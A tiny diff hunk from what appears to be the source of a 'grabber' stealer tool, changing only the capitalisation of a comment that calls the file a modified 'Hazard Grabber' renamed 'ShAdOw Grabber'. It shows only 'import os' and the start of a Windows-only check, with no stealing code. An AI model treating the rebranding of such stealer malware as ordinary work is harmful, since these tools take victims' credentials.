@@ -1,5 +1,5 @@
 #CREDITS: 'https://github.com/Rdimo' for base code :) 
-# Modified version of 'Hazard Grabber' -- Name: ShAdOw grabber
+# Modified version of 'Hazard Grabber' -- Name: ShAdOw Grabber
 
 import os
 if os.name != "nt":
